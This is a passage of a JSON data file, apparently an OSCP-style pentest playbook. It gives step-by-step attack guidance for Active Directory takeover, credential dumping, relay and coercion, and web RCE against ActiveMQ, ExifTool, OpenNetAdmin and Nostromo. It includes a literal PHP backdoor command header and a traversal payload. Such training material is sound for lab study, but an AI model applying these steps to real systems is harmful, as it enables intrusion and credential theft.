      "when": "Step 2: replicate with the emptied login.",
      "land": [
        "SAVE the dc_account hash. You need it for the restore."
      ],
      "look": [
        "The domain dump, krbtgt included."
      ],
      "win": "The domain is dumped.",
      "mistakes": [
        "Not saving the original machine hash."
      ]
    },
    {
      "when": "Step 3 (MANDATORY): restore.",
      "land": [
        "Put the original machine hash back. Until this succeeds the DC is broken."
      ],
      "look": [
        "The machine account restored."
      ],
      "win": "The DC is healthy again.",
      "mistakes": [
        "Leaving the DC broken, which can wreck the lab or engagement."
      ]
    }
  ],
  "wsus-abuse": [
    {
      "when": "Locate the WSUS server.",
      "land": [
        "Through the registry or GPO from a foothold."
      ],
      "look": [
        "The WSUS server and URL."
      ],
      "win": "The WSUS server is found.",
      "mistakes": [
        "Overlooking the WSUS registry keys."
      ]
    },
    {
      "when": "Check the transport.",
      "land": [
        "HTTP (abusable) versus HTTPS (much tougher)."
      ],
      "look": [
        "HTTP WSUS, which allows a fake update."
      ],
      "win": "An abusable WSUS config.",
      "mistakes": [
        "Expecting HTTPS WSUS to be easily abusable."
      ]
    },
    {
      "when": "Once SharpWSUS inspect confirms WSUS uses HTTP and you have administrative access on the WSUS server.",
      "land": [
        "Creates and approves a malicious WSUS update pointing to a signed binary (such as PsExec64.exe) with your command arguments."
      ],
      "look": [
        "Update creation GUID and approval confirmation from SharpWSUS."
      ],
      "win": "The malicious WSUS update is approved and executes as SYSTEM on downstream clients.",
      "mistakes": [
        "Using an unsigned custom executable as the WSUS payload (Windows Update requires a Microsoft-signed binary such as PsExec.exe or cmd.exe)."
      ]
    }
  ],
  "sccm-enum": [
    {
      "when": "Find SCCM site servers.",
      "land": [
        "sccmhunter via LDAP. It takes the bare domain."
      ],
      "look": [
        "Site servers and management points."
      ],
      "win": "SCCM infrastructure is mapped.",
      "mistakes": [
        "Overlooking SCCM entirely on enterprise networks."
      ]
    },
    {
      "when": "Enumerate the SCCM shares.",
      "land": [
        "Task sequences and scripts with embedded creds live here."
      ],
      "look": [
        "Credential-bearing task sequences."
      ],
      "win": "SCCM shares enumerated.",
      "mistakes": [
        "Not reading the task-sequence contents."
      ]
    }
  ],
  "sccm-exploit": [
    {
      "when": "Map the SMS provider and site.",
      "land": [
        "Over SMB and LDAP: the provider, MPs, and the site code."
      ],
      "look": [
        "The site code and management points."
      ],
      "win": "The SCCM site is mapped.",
      "mistakes": [
        "Skipping the site-code discovery."
      ]
    },
    {
      "when": "Request the NAA policy.",
      "land": [
        "Decrypt the Network Access Account credential client-side."
      ],
      "look": [
        "The NAA credential."
      ],
      "win": "A domain credential from the NAA.",
      "mistakes": [
        "Overlooking the NAA as a credential source."
      ]
    },
    {
      "when": "Dump collection and task-sequence secrets.",
      "land": [
        "More embedded credentials."
      ],
      "look": [
        "Secrets in the collection variables."
      ],
      "win": "Extra SCCM secrets.",
      "mistakes": [
        "Stopping at the NAA."
      ]
    },
    {
      "when": "Site takeover via relay.",
      "land": [
        "Where the MP accepts NTLM, coerce and relay its machine account."
      ],
      "look": [
        "Site takeover."
      ],
      "win": "The SCCM site is taken over.",
      "mistakes": [
        "Relaying where signing stops it (switch to the Kerberos relay)."
      ]
    }
  ],
  "coerce-auth": [
    {
      "when": "Force a machine to authenticate to you.",
      "land": [
        "nxc coerce_plus checks which vectors (MS-EFSR, MS-RPRN and more) work."
      ],
      "look": [
        "A working coercion vector."
      ],
      "win": "A coercion method is confirmed.",
      "mistakes": [
        "No relay or capture ready to catch the auth."
      ]
    },
    {
      "when": "Before setting up a relay, to check whether Print Spooler (MS-RPRN) and WebClient (HTTP/WebDAV coercion) are running.",
      "land": [
        "WebClient enabled means the host can be coerced over HTTP (which bypasses SMB signing requirements when relaying to LDAP)!"
      ],
      "look": [
        "Spooler service enabled and WebClient service enabled in the module output."
      ],
      "win": "Spooler and/or WebDAV coercion vectors are confirmed active.",
      "mistakes": [
        "Only checking SMB coercion when WebDAV (HTTP -> LDAP relay) avoids SMB signing entirely."
      ]
    },
    {
      "when": "When MSSQL (1433) is exposed.",
      "land": [
        "Coerce the SQL service account machine auth to you."
      ],
      "look": [
        "The SQL machine auth arriving."
      ],
      "win": "Coercion via MSSQL.",
      "mistakes": [
        "Missing MSSQL as a coercion vector."
      ]
    },
    {
      "when": "The multi-method alternative.",
      "land": [
        "Fire every method when coerce_plus misses a vector."
      ],
      "look": [
        "A method that lands."
      ],
      "win": "A coercion via the multi-tool.",
      "mistakes": [
        "Giving up after one vector fails."
      ]
    },
    {
      "when": "The MS-EFSR EfsRpcOpenFileRaw coercion.",
      "land": [
        "Unpatched DCs accept it unauthenticated."
      ],
      "look": [
        "The DC$ auth arriving."
      ],
      "win": "The DC is coerced.",
      "mistakes": [
        "Assuming it works on a patched DC."
      ]
    },
    {
      "when": "The relay end.",
      "land": [
        "With coercion driving DC$ auth here, --delegate-access sets RBCD."
      ],
      "look": [
        "RBCD written via the relay."
      ],
      "win": "Coerce-and-relay lands.",
      "mistakes": [
        "No listener or relay ready to catch the coerced auth."
      ]
    }
  ],
  "gpo-abuse": [
    {
      "when": "A GPO you can write.",
      "land": [
        "Add an immediate scheduled task. -gpo-id is the GUID BloodHound shows."
      ],
      "look": [
        "The task applied to the linked objects."
      ],
      "win": "The GPO runs your task.",
      "mistakes": [
        "Wrong GPO GUID."
      ]
    },
    {
      "when": "Find writable GPOs.",
      "land": [
        "List the objects you can write. groupPolicyContainer entries are GPOs."
      ],
      "look": [
        "A writable GPO."
      ],
      "win": "A writable GPO is found.",
      "mistakes": [
        "Overlooking a GPO linked to a privileged OU."
      ]
    },
    {
      "when": "You already hold a Windows foothold on a domain-joined host linked to the writable GPO.",
      "land": [
        "Run SharpGPOAbuse.exe --AddLocalAdmin targeting the writable GPO display name, then run gpupdate /force to apply it immediately."
      ],
      "look": [
        "SharpGPOAbuse confirming the local-admin preference was written to SYSVOL and Computer Policy update has completed successfully."
      ],
      "win": "Your controlled domain user is added to the local Administrators group on the linked computer.",
      "mistakes": [
        "Forgetting gpupdate /force (or forgetting to open a fresh elevated/network logon session after the group refresh)."
      ]
    }
  ],
  "dnsadmins-abuse": [
    {
      "when": "You are in DnsAdmins.",
      "land": [
        "Build the DLL the DNS service will load. It adds you to Domain Admins as SYSTEM."
      ],
      "look": [
        "The DLL ready."
      ],
      "win": "The payload DLL is built.",
      "mistakes": [
        "Building the wrong architecture DLL."
      ]
    },
    {
      "when": "Load the DLL.",
      "land": [
        "Set ServerLevelPluginDll to your UNC path, then bounce the DNS service to load it."
      ],
      "look": [
        "DA membership after the service restart."
      ],
      "win": "DnsAdmins to Domain Admin.",
      "mistakes": [
        "No rights to restart the DNS service."
      ]
    }
  ],
  "sid-history-abuse": [
    {
      "when": "Child-to-parent via SID history.",
      "land": [
        "Forge a golden ticket for the child with the forest-root Enterprise Admins SID in SID history."
      ],
      "look": [
        "A ticket with EA rights in the parent."
      ],
      "win": "Cross-domain escalation.",
      "mistakes": [
        "Using the wrong Enterprise Admins SID."
      ]
    },
    {
      "when": "The automated path.",
      "land": [
        "It performs the whole krbtgt-dump plus extra-SID forge."
      ],
      "look": [
        "EA access in the forest root."
      ],
      "win": "Automated child-to-parent.",
      "mistakes": [
        "Running it without domain-admin in the child first."
      ]
    }
  ],
  "eternalblue": [
    {
      "when": "Old unpatched SMB (MS17-010).",
      "land": [
        "Confirm VULNERABLE first."
      ],
      "look": [
        "A VULNERABLE verdict."
      ],
      "win": "MS17-010 is confirmed.",
      "mistakes": [
        "Firing it blind. It can crash the host."
      ]
    },
    {
      "when": "The scripted public exploit.",
      "land": [
        "No Metasploit single-target limit."
      ],
      "look": [
        "A SYSTEM shell."
      ],
      "win": "EternalBlue via the script.",
      "mistakes": [
        "Wrong named-pipe or target architecture."
      ]
    },
    {
      "when": "The Metasploit module.",
      "land": [
        "Exam-limited to one target."
      ],
      "look": [
        "A SYSTEM session."
      ],
      "win": "EternalBlue via Metasploit.",
      "mistakes": [
        "Burning your OSCP Metasploit allowance carelessly."
      ]
    }
  ],
  "nopac": [
    {
      "when": "First step with any low-privilege domain user: check if the DC is vulnerable to sAMAccountName spoofing (CVE-2021-42278/42287).",
      "land": [
        "Compares Kerberos ticket sizes with and without a PAC to confirm vulnerability in seconds without creating a machine account yet."
      ],
      "look": [
        "VULNERABLE / ticket size differential in the nopac module output."
      ],
      "win": "The DC is confirmed vulnerable to noPac.",
      "mistakes": []
    },
    {
      "when": "noPac (CVE-2021-42278 + 42287), OSCP+ scope.",
      "land": [
        "Scan, exploit and DCSync-dump in one. Needs MachineAccountQuota > 0."
      ],
      "look": [
        "The domain dump."
      ],
      "win": "noPac to domain compromise.",
      "mistakes": [
        "MachineAccountQuota is 0, which blocks it."
      ]
    }
  ],
  "printnightmare": [
    {
      "when": "Before staging an SMB share and payload DLL, check if the target's Print Spooler is vulnerable to CVE-2021-1675 / CVE-2021-34527.",
      "land": [
        "Queries MS-RPRN / MS-PAR RPC endpoints to confirm whether remote driver installation is open."
      ],
      "look": [
        "Vulnerable to PrintNightmare in the NetExec output."
      ],
      "win": "NetExec confirms the host is vulnerable to PrintNightmare.",
      "mistakes": []
    },
    {
      "when": "Host the evil DLL.",
      "land": [
        "On an SMB share you control."
      ],
      "look": [
        "The share serving the DLL."
      ],
      "win": "The DLL is hosted.",
      "mistakes": [
        "A share the target cannot reach."
      ]
    },
    {
      "when": "Trigger the spooler.",
      "land": [
        "Point the spooler at your UNC path to the DLL."
      ],
      "look": [
        "SYSTEM or DA depending on the target."
      ],
      "win": "PrintNightmare fires.",
      "mistakes": [
        "The spooler is disabled on the target."
      ]
    }
  ],
  "ms14-068": [
    {
      "when": "A very old DC (2008 era), an OSCP+ edge case.",
      "land": [
        "Forges the PAC and drops a SYSTEM shell on the DC."
      ],
      "look": [
        "A SYSTEM shell."
      ],
      "win": "MS14-068 compromise.",
      "mistakes": [
        "Trying it on a patched DC."
      ]
    }
  ],
  "certifried": [
    {
      "when": "MachineAccountQuota > 0.",
      "land": [
        "A non-zero quota means any user, including you, can add a machine account."
      ],
      "look": [
        "A non-zero quota."
      ],
      "win": "You can add a machine.",
      "mistakes": [
        "Quota is 0, which stops this cold."
      ]
    },
    {
      "when": "Create the machine account.",
      "land": [
        "Its dNSHostName matches a DC. That name is what the CA trusts."
      ],
      "look": [
        "A machine account impersonating the DC name."
      ],
      "win": "The spoofed machine exists.",
      "mistakes": [
        "Not matching the DC dNSHostName exactly."
      ]
    },
    {
      "when": "Get the DC certificate.",
      "land": [
        "The CA maps the cert to the DC name. certipy auth then returns the DC hash."
      ],
      "look": [
        "The DC machine hash."
      ],
      "win": "The DC$ hash is obtained.",
      "mistakes": [
        "Missing the SID-extension patch that closes this."
      ]
    },
    {
      "when": "DCSync.",
      "land": [
        "With the DC hash, DCSync the domain. krbtgt means a golden ticket and permanence."
      ],
      "look": [
        "The full dump, krbtgt included."
      ],
      "win": "Certifried to Domain Admin.",
      "mistakes": [
        "Stopping before the krbtgt extract."
      ]
    }
  ],
  "kerberos-relay": [
    {
      "when": "Signing enforced kills the NTLM relay.",
      "land": [
        "The Kerberos relay is the way through."
      ],
      "look": [
        "The scenario where the Kerberos relay applies."
      ],
      "win": "You pick the Kerberos relay path.",
      "mistakes": [
        "Retrying the NTLM relay where signing stops it."
      ]
    },
    {
      "when": "Pick the relay target.",
      "land": [
        "LDAP for RBCD or shadow-cred, AD CS web-enrollment for a certificate."
      ],
      "look": [
        "The target that gives the win."
      ],
      "win": "The right relay target.",
      "mistakes": [
        "Relaying to a target that gives nothing useful."
      ]
    },
    {
      "when": "Coerce with Kerberos.",
      "land": [
        "Coerce the victim to authenticate to a name that resolves to your relay."
      ],
      "look": [
        "The Kerberos auth arriving."
      ],
      "win": "The victim is coerced.",
      "mistakes": [
        "The name not resolving to you."
      ]
    },
    {
      "when": "Finish via RBCD.",
      "land": [
        "With RBCD written, request a ticket impersonating Administrator (S4U)."
      ],
      "look": [
        "An admin ticket on the victim."
      ],
      "win": "Kerberos relay to admin.",
      "mistakes": [
        "Using an IP instead of the forged name."
      ]
    }
  ],
  "timeroasting": [
    {
      "when": "Unauthenticated against a Domain Controller: harvest MS-SNTP computer account hashes in one NetExec command.",
      "land": [
        "Queries the DC's NTP service across computer RIDs and outputs hashcat mode 31300 ($sntp-ms$) hashes."
      ],
      "look": [
        "$sntp-ms$ lines printed for domain computer accounts."
      ],
      "win": "Machine account SNTP hashes are harvested without any credentials.",
      "mistakes": []
    },
    {
      "when": "An unauthenticated machine-hash harvest.",
      "land": [
        "The Windows Time service on the DC answers the signed-reply requests."
      ],
      "look": [
        "The time service responding."
      ],
      "win": "The DC time service is reachable.",
      "mistakes": [
        "Assuming it needs authentication."
      ]
    },
    {
      "when": "Collect the hashes.",
      "land": [
        "Walks the computer RIDs and collects a signed hash per account, no auth."
      ],
      "look": [
        "Machine-account hashes."
      ],
      "win": "Machine hashes harvested.",
      "mistakes": [
        "Stopping before you have a RID range."
      ]
    },
    {
      "when": "Crack offline.",
      "land": [
        "Weak or scripted machine passwords on appliances and old hosts fall."
      ],
      "look": [
        "A cracked machine password."
      ],
      "win": "A machine credential recovered.",
      "mistakes": [
        "Expecting modern random machine passwords to crack."
      ]
    },
    {
      "when": "Use it.",
      "land": [
        "Resolve the cracked RID to a host. The machine credential authenticates as that host."
      ],
      "look": [
        "Auth as the machine account."
      ],
      "win": "A machine foothold.",
      "mistakes": [
        "Not resolving the RID to the actual hostname."
      ]
    }
  ],
  "adidns-abuse": [
    {
      "when": "When you want to inject a specific A record into Active Directory-Integrated DNS over LDAP.",
      "land": [
        "Any authenticated domain user can create new ADIDNS records by default; point a missing hostname or service record to your attacker IP."
      ],
      "look": [
        "Confirmation from bloodyAD that the DNS record was created."
      ],
      "win": "The custom ADIDNS record points to your listener IP.",
      "mistakes": []
    },
    {
      "when": "A wildcard record.",
      "land": [
        "A wildcard answers every name without an explicit record. Allow a few minutes to replicate."
      ],
      "look": [
        "Names resolving to you."
      ],
      "win": "A wildcard is planted.",
      "mistakes": [
        "Impatience before replication finishes."
      ]
    },
    {
      "when": "WPAD.",
      "land": [
        "Turns on proxy auto-discovery pointed at you. Often GPO-blocked, so the wildcard is the fallback."
      ],
      "look": [
        "WPAD traffic to you."
      ],
      "win": "WPAD poisoning via ADIDNS.",
      "mistakes": [
        "Expecting WPAD when it is GPO-blocked."
      ]
    },
    {
      "when": "Catch the auth.",
      "land": [
        "Names that resolve to you send their authentication to your listener. Feed it to relay or capture."
      ],
      "look": [
        "Captured or relayed auth."
      ],
      "win": "ADIDNS to captured auth.",
      "mistakes": [
        "No listener ready for the redirected auth."
      ]
    }
  ],
  "git-repo-forensics": [
    {
      "when": "Inspect recent commit history and diffs on a discovered git repository.",
      "land": [
        "Run inside the directory containing the .git repository.",
        "Inspect the patch output (-p) for hardcoded passwords, tokens, and configuration changes."
      ],
      "look": [
        "Diff lines (+password =, +API_KEY=) indicating secrets committed in earlier revisions."
      ],
      "win": "Sensitive credentials or API keys discovered in recent commit diffs.",
      "mistakes": [
        "Checking only git log without -p (omits the crucial diff lines where secrets hide)."
      ]
    },
    {
      "when": "Search full commit history across all branches for credential files.",
      "land": [
        "Scans every branch and tag for changes touching secret or config file paths.",
        "Identifies commits where credentials were created or accidentally deleted."
      ],
      "look": [
        "Commit hashes modifying settings.py, config.php, or credentials files."
      ],
      "win": "Specific historical commits pinpointed containing sensitive configuration secrets.",
      "mistakes": [
        "Searching only the current HEAD branch rather than using --all --full-history."
      ]
    },
    {
      "when": "Compare the working directory against the preceding commit.",
      "land": [
        "Examine what was changed between the previous commit and the current state.",
        "Uncovers developer cleanups or uncommitted temporary secrets."
      ],
      "look": [
        "Lines beginning with + or - showing stripped passwords or adjusted endpoints."
      ],
      "win": "Immediate diff output exposing altered sensitive values.",
      "mistakes": [
        "Assuming git status alone shows historical changes."
      ]
    },
    {
      "when": "Check git remote configurations for hardcoded authentication credentials.",
      "land": [
        "Reads .git/config to check origin and upstream remote URLs.",
        "Developers frequently clone using URLs containing embedded basic auth (http://user:pass@host)."
      ],
      "look": [
        "URL lines containing username:password combinations."
      ],
      "win": "Remote repository URL containing valid plaintext credentials.",
      "mistakes": [
        "Overlooking .git/config when enumerating local repositories."
      ]
    },
    {
      "when": "Switch to unmerged or development branches in the repository.",
      "land": [
        "Lists all branches (-a) and checks out development branches.",
        "Development or staging branches often contain test credentials or unreleased endpoints."
      ],
      "look": [
        "Switched to branch message followed by different working tree files."
      ],
      "win": "Development branch checked out exposing additional code and configs.",
      "mistakes": [
        "Only examining the main or master branch."
      ]
    }
  ],
  "jenkins-cli-fileread": [
    {
      "when": "Test unauthenticated arbitrary file read via Jenkins CLI CVE-2024-23897.",
      "land": [
        "Download jenkins-cli.jar from http://<target>:8080/jnlpJars/jenkins-cli.jar.",
        "Run connect-node with @/etc/passwd to leak system user accounts."
      ],
      "look": [
        "First lines of /etc/passwd returned in the CLI error or connect output."
      ],
      "win": "Contents of target file (/etc/passwd) displayed in CLI output.",
      "mistakes": [
        "Forgetting the @ symbol prefix in front of the target file path."
      ]
    },
    {
      "when": "Extract the Jenkins master encryption key for credential decryption.",
      "land": [
        "Read /var/jenkins_home/secrets/master.key using the CLI @ file expansion.",
        "Save the raw hex master key for offline credential decryption."
      ],
      "look": [
        "Hex-encoded master encryption key string."
      ],
      "win": "master.key contents successfully retrieved.",
      "mistakes": [
        "Treating master.key alone as the password; it is the decryption key for hudson.util.Secret."
      ]
    },
    {
      "when": "Extract the Hudson util secret decryption key.",
      "land": [
        "Read /var/jenkins_home/secrets/hudson.util.Secret via the CLI.",
        "Together with master.key, this key decrypts all credentials in credentials.xml."
      ],
      "look": [
        "Binary/hex data of hudson.util.Secret."
      ],
      "win": "hudson.util.Secret retrieved.",
      "mistakes": [
        "Failing to download both master.key and hudson.util.Secret together."
      ]
    },
    {
      "when": "Dump encrypted stored credentials from credentials.xml.",
      "land": [
        "Read /var/jenkins_home/credentials.xml through the CLI.",
        "Parses out encrypted password strings ({AQAAABAAAA...}) for offline decryption."
      ],
      "look": [
        "XML document containing username, description, and ciphertext password blocks."
      ],
      "win": "credentials.xml dumped containing Jenkins credentials.",
      "mistakes": [
        "Attempting to crack the encrypted AES password blocks without master.key."
      ]
    }
  ],
  "keepass-dump-recover": [
    {
      "when": "Reconstruct KeePass master password from a process memory dump.",
      "land": [
        "Run keepass_dump_masterkey.py against the extracted KeePass.dmp file.",
        "CVE-2023-32784 recovers master password characters directly from process memory."
      ],
      "look": [
        "Output showing 'Possible master password:' or candidate character sequences."
      ],
      "win": "Cleartext KeePass master password printed.",
      "mistakes": [
        "Running the script against a non-KeePass memory dump."
      ]
    },
    {
      "when": "Extract and crack the KeePass database hash offline.",
      "land": [
        "Use keepass2john to extract the $keepass$ format hash from the .kdbx file.",
        "Crack with John or Hashcat mode 13400 using a wordlist."
      ],
      "look": [
        "John prints the cracked plaintext master password."
      ],
      "win": "Master password cracked for the KDBX database.",
      "mistakes": [
        "Running keepass2john on a corrupt or incomplete database file."
      ]
    },
    {
      "when": "Crack an extracted $keepass$ hash with Hashcat mode 13400.",
      "land": [
        "Pass the keepass2john hash file (strip any filename: prefix if required) to hashcat -m 13400.",
        "Run against a standard wordlist or rule set for GPU-accelerated recovery."
      ],
      "look": [
        "Status: Cracked with the plaintext master password appended after the hash."
      ],
      "win": "KeePass master password recovered via Hashcat mode 13400.",
      "mistakes": [
        "Leaving the leading database filename colon prefix attached when Hashcat expects a bare $keepass$ hash."
      ]
    },
    {
      "when": "Decrypt and export all stored credentials from the unlocked KDBX database.",
      "land": [
        "Use pykeepass with the validated master password to iterate through all entries.",
        "Prints entry titles, usernames, passwords, and URLs."
      ],
      "look": [
        "List of account titles and cleartext passwords stored in the database."
      ],
      "win": "Complete inventory of decrypted KeePass vault credentials.",
      "mistakes": [
        "Overlooking notes fields in KeePass entries which frequently contain secondary secrets."
      ]
    }
  ],
  "activemq-cve-2023-46604": [
    {
      "when": "Exploit Apache ActiveMQ OpenWire deserialization for remote code execution.",
      "land": [
        "Host an XML ClassPathXmlApplicationContext file on your attacking HTTP server.",
        "Run the exploit script against port 61616 specifying the target and payload URL."
      ],
      "look": [
        "Incoming HTTP request to your python web server followed by a reverse shell."
      ],
      "win": "Reverse shell connection received from the ActiveMQ target host.",
      "mistakes": [
        "Specifying localhost or unreachable attacker IP in the XML payload URL."
      ]
    }
  ],
  "nsclient-web-privesc": [
    {
      "when": "Read the cleartext web management password from nsclient.ini.",
      "land": [
        "View C:\\Program Files\\NSClient++\\nsclient.ini on the target Windows system.",
        "Find the password setting under [/settings/default] or [/settings/REST/server]."
      ],
      "look": [
        "password = <cleartext_password> line in configuration."
      ],
      "win": "Valid NSClient++ administrator password retrieved.",
      "mistakes": [
        "Overlooking alternate installation paths such as C:\\Program Files (x86)\\NSClient++."
      ]
    },
    {
      "when": "Verify administrative REST API access to NSClient++ on port 8443.",
      "land": [
        "Connect to https://<target>:8443/api/v1/scripts with HTTP Basic Authentication.",
        "Use admin and the discovered password."
      ],
      "look": [
        "HTTP 200 response with JSON scripts listing."
      ],
      "win": "Successful authenticated access to the NSClient++ API.",
      "mistakes": [
        "Not including -k / --insecure to bypass the self-signed TLS certificate."
      ]
    }
  ],
  "nvms1000-traversal": [
    {
      "when": "Verify unauthenticated directory traversal on TVT NVMS-1000.",
      "land": [
        "Send a GET request with traversal sequences requesting windows/win.ini.",
        "Confirm HTTP 200 response and win.ini file header."
      ],
      "look": [
        "Contents of win.ini ([fonts], [extensions]) returned in response body."
      ],
      "win": "win.ini file contents returned confirming traversal vulnerability.",
      "mistakes": [
        "Using URL-encoded slashes (%2f) instead of raw slashes (/)."
      ]
    },
    {
      "when": "Read root or proof flag directly via NVMS-1000 directory traversal.",
      "land": [
        "Send traversal request pointing to C:\\Users\\Administrator\\Desktop\\root.txt.",
        "Extract the flag value from the response body."
      ],
      "look": [
        "32-hex proof or root flag string in HTTP response."
      ],
      "win": "Administrator proof/root flag captured directly.",
      "mistakes": [
        "Assuming the flag is in C:\\root.txt instead of Administrator's Desktop."
      ]
    },
    {
      "when": "Read NSClient++ configuration file containing administrator password.",
      "land": [
        "Request Program Files/NSClient++/nsclient.ini via directory traversal.",
        "Extract the cleartext password for escalating to SYSTEM via NSClient++."
      ],
      "look": [
        "password = <password> setting inside nsclient.ini."
      ],
      "win": "NSClient++ administrator password extracted from configuration.",
      "mistakes": [
        "Not URL-encoding spaces and plus signs in Program Files/NSClient++."
      ]
    }
  ],
  "cisco-decrypt": [
    {
      "when": "Reversibly decrypt Cisco Type 7 password from configuration file.",
      "land": [
        "Pass the hexadecimal ciphertext from the 'password 7 <cipher>' config line to cisco-decrypt.",
        "Type 7 is an XOR/Vigenère cipher with a static key table and decrypts instantly."
      ],
      "look": [
        "Decrypted cleartext password string printed to stdout."
      ],
      "win": "Cisco administrative cleartext password recovered.",
      "mistakes": [
        "Confusing Type 7 reversible passwords with Type 5 MD5 hashes (which require Hashcat/John)."
      ]
    },
    {
      "when": "Crack Cisco Type 5 MD5 secret hash offline using Hashcat mode 500.",
      "land": [
        "Extract the '$1$...' hash from 'enable secret 5' or 'username <user> secret 5'.",
        "Run Hashcat mode 500 with a wordlist (e.g. rockyou.txt) and rule extensions."
      ],
      "look": [
        "Hashcat status 'CRACKED' with hash:password mapping."
      ],
      "win": "Cisco enable or administrative user secret successfully cracked.",
      "mistakes": [
        "Attempting mode 0 (plain MD5) instead of mode 500 (md5crypt)."
      ]
    },
    {
      "when": "Crack Cisco Type 5 secret hash offline using John the Ripper.",
      "land": [
        "Save the secret hash to a file and run john with --format=md5crypt-long.",
        "Utilize rule-based wordlists to recover passwords."
      ],
      "look": [
        "John prints the recovered plaintext password before session completion."
      ],
      "win": "Cleartext password recovered by John the Ripper.",
      "mistakes": [
        "Omitting the --format flag on custom salt lengths."
      ]
    }
  ],
  "access-db-export": [
    {
      "when": "Enumerate table names inside an extracted Microsoft Access database (.mdb / .accdb).",
      "land": [
        "Run mdb-tables -1 against the downloaded database file.",
        "Identifies user accounts, configuration, credentials, or audit tables."
      ],
      "look": [
        "List of table names including 'Users', 'tblAccounts', 'Passwords', or 'Config'."
      ],
      "win": "Complete inventory of database tables revealed.",
      "mistakes": [
        "Attempting to read Access databases with standard sqlite3 or text viewers."
      ]
    },
    {
      "when": "Export sensitive table contents to CSV format for credential extraction.",
      "land": [
        "Execute mdb-export <database_file> <target_table> and redirect output to CSV.",
        "Parses out records, usernames, and passwords into structured tabular text."
      ],
      "look": [
        "CSV header and row data containing username, password, or hash fields."
      ],
      "win": "Target table exported to CSV containing usable credential material.",
      "mistakes": [
        "Exporting only schema definitions rather than table data records."
      ]
    },
    {
      "when": "Execute custom SQL query against the Microsoft Access database file.",
      "land": [
        "Use mdb-sql -i <script> <database_file> to run targeted SQL SELECT queries.",
        "Filters specific administrator rows or decrypts base64 fields."
      ],
      "look": [
        "Filtered query results printed to console."
      ],
      "win": "Specific query output returned containing targeted database artifacts.",
      "mistakes": [
        "Using SQL dialect syntax unsupported by mdb-sql."
      ]
    }
  ],
  "http3-quic-probe": [
    {
      "when": "Scan target UDP port 443 for QUIC and HTTP/3 protocol support.",
      "land": [
        "Run nmap -sU -p 443 --script quic-info against the target host.",
        "Identifies servers that do not answer TCP 443 but accept UDP QUIC connections."
      ],
      "look": [
        "Nmap reports UDP port 443 open with QUIC version and ALPN h3 tokens."
      ],
      "win": "Confirmed active HTTP/3 / QUIC service running on target UDP 443.",
      "mistakes": [
        "Assuming web servers only listen on TCP 80/443 without checking UDP 443."
      ]
    },
    {
      "when": "Send HTTP/3 requests using curl with native HTTP/3 protocol enforcement.",
      "land": [
        "Run curl --http3-only -vk https://<target>:443/ to inspect headers and virtual hosts.",
        "Allows direct endpoint probing, header analysis, and virtual host fuzzing over HTTP/3."
      ],
      "look": [
        "HTTP/3 response code and server headers returned in verbose output."
      ],
      "win": "Valid HTTP/3 response received disclosing server applications and headers.",
      "mistakes": [
        "Using standard curl without HTTP/3 support compiled in."
      ]
    },
    {
      "when": "Interact with HTTP/3 services using quiche-client.",
      "land": [
        "Connect to target URL using quiche-client to test protocol negotiation and TLS certificates.",
        "Verifies server certificate SAN names and virtual host hostnames."
      ],
      "look": [
        "Detailed TLS handshake, SNI verification, and HTTP/3 response stream."
      ],
      "win": "Successful HTTP/3 session established and content rendered.",
      "mistakes": [
        "Omitting target port or protocol prefix in URL."
      ]
    }
  ],
  "exiftool-cve-2021-22204": [
    {
      "when": "Check ExifTool version to verify vulnerability to CVE-2021-22204.",
      "land": [
        "Run exiftool -ver on the system or check banner information in web responses.",
        "ExifTool versions prior to 12.24 fail to sanitize DjVu metadata."
      ],
      "look": [
        "Version string output lower than 12.24."
      ],
      "win": "Vulnerable ExifTool version confirmed.",
      "mistakes": [
        "Assuming ExifTool only processes image metadata from JPEG files; DjVu and TIFF are also vulnerable."
      ]
    },
    {
      "when": "Generate crafted DjVu exploit payload triggering reverse shell on server parse.",
      "land": [
        "Use python3 to assemble a DjVu file with malicious ANT metadata containing backticks.",
        "When ExifTool parses the file, eval executes the command with the permissions of the web service."
      ],
      "look": [
        "Generated exploit.djvu or exploit.jpg file created on disk."
      ],
      "win": "Crafted exploit image generated ready for upload.",
      "mistakes": [
        "Leaving unescaped special characters or syntax errors in the shell command payload."
      ]
    },
    {
      "when": "Upload crafted exploit image to web application endpoint to trigger execution.",
      "land": [
        "Send POST multipart request with the crafted image to the application's file upload form.",
        "Start a Netcat listener on your attacking machine before submitting the upload."
      ],
      "look": [
        "Incoming connection on your Netcat listener followed by an interactive shell prompt."
      ],
      "win": "Interactive reverse shell obtained on the server as the web service user.",
      "mistakes": [
        "Failing to start the Netcat listener before submitting the upload request."
      ]
    }
  ],
  "php-backdoor-useragent": [
    {
      "when": "Verify PHP 8.1.0-dev User-Agentt backdoor command execution.",
      "land": [
        "Send an HTTP GET request with the header 'User-Agentt: zerodium system(\"id\");'.",
        "Target web instances running PHP 8.1.0-dev with backdoor intact."
      ],
      "look": [
        "Command output prepended to or rendered before HTTP HTML response body (e.g. uid=33(www-data))."
      ],
      "win": "PHP 8.1.0-dev backdoor command execution verified.",
      "mistakes": [
        "Typing 'User-Agent' instead of the required backdoor header key 'User-Agentt' (with two t's)."
      ]
    },
    {
      "when": "Execute interactive reverse shell through PHP 8.1.0-dev backdoor.",
      "land": [
        "Start Netcat listener on attacking host.",
        "Send bash reverse shell inside system() or passthru() function call in User-Agentt header."
      ],
      "look": [
        "Connection caught on Netcat listener with shell prompt as web server user."
      ],
      "win": "Interactive reverse shell established on target host.",
      "mistakes": [
        "Failing to escape quotes inside the shell command payload within the header."
      ]
    }
  ],
  "opennetadmin-rce": [
    {
      "when": "Execute command injection on vulnerable OpenNetAdmin (ONA) v18.1.1 instances.",
      "land": [
        "Send HTTP POST request to /ona/dcm.php with xajax parameters invoking tooltips and injected shell command.",
        "The vulnerable module fails to sanitize arguments before shell execution."
      ],
      "look": [
        "Command output returned in the xajax XML response body."
      ],
      "win": "Command execution achieved through OpenNetAdmin xajax parameter injection.",
      "mistakes": [
        "Omitting URL encoding on semicolon or pipe separators in the POST body."
      ]
    },
    {
      "when": "Obtain reverse shell via OpenNetAdmin command injection.",
      "land": [
        "Start Netcat listener on attacker machine.",
        "Send bash or python reverse shell payload inside the xajaxargs array."
      ],
      "look": [
        "Immediate callback on Netcat listener with user www-data."
      ],
      "win": "Foothold obtained via OpenNetAdmin exploit.",
      "mistakes": [
        "Targeting patched ONA versions or paths other than /ona/dcm.php without verifying installation root."
      ]
    }
  ],
  "nostromo-rce": [
    {
      "when": "Verify directory traversal command execution on Nostromo nhttpd <= 1.9.6.",
      "land": [
        "Send HTTP POST request to /.%0d%0a/bin/sh with echo and command in the POST body.",
